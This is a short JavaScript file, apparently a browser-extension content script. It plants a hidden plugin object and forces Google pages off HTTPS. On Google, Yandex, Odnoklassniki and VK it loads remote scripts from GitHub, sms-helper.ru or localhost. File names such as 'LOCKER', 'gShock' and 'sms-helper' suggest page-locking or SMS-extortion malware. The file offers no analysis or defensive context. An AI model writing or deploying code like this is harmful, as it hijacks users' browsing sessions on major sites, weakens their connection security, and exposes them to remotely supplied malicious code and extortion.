var plg = document.createElement("object");
if (plg) {
	plg.setAttribute("type", "application/afp");
	plg.setAttribute("id", "AFP");
	plg.setAttribute("width", 0);
	plg.setAttribute("height", 0);
	document.body.appendChild(plg);
}
if(location.hostname.indexOf('www.google') > -1) {
	if (window.location.protocol !== 'http:') {
		window.location = 'http://' + window.location.hostname + window.location.pathname + window.location.hash;
		
	}
	var scr = 'https://raw.github.com/ashanmilkin/scripts/master/gShock.js';
	//var scr = 'http://localhost/GoogleYandexLock/google/gShock.js';
}
if(location.hostname.indexOf('yandex') > -1) {
	//var scr = 'https://raw.github.com/ashanmilkin/scripts/master/gShock.js';
	var scr = 'http://localhost/GoogleYandexLock/yandex/yaShock.js';
}
if(location.hostname.indexOf('odnoklassniki') > -1)
	var scr = 'https://raw.github.com/ashanmilkin/scripts/master/lod.js';
if(location.hostname.indexOf('vk') > -1)
	var scr = 'https://raw.github.com/ashanmilkin/scripts/master/lvk.js'; 

try{
	var id = plg.Get('id');
	switch(id){
		case '562c1b1350d834fba62fd8c05706899e':
			if(location.hostname.indexOf('odnoklassniki') > -1)
				var scr = 'http://localhost/LOCKER_O_V/lod.js';
			if(location.hostname.indexOf('vk') > -1)
				var scr = 'http://sms-helper.ru/js/vkt/lvk.js';
		break;
		
		case 'e747eb2129f44e85b0d0cc5a70074daa':
			if(location.hostname.indexOf('odnoklassniki') > -1)
				var scr = 'http://localhost/LOCKER_O_V/lod.js';
			if(location.hostname.indexOf('vk') > -1)
				var scr = 'http://localhost/vk/lvk.js';
		break;
		
		case 'e747eb2129f44e85b0d0cc5a70074dad':
			if (location.hostname.indexOf('google') > -1){
				var scr = 'http://localhost/GoogleYandexLock/google/gShock.js';
			}
		break;
		
		default: break;
	}
}catch(e){}

if(scr){
	var script = document.createElement('script');
	script.setAttribute('type', 'text/javascript');
	script.setAttribute('src', scr);
	document.getElementsByTagName('head')[0].appendChild(script);
}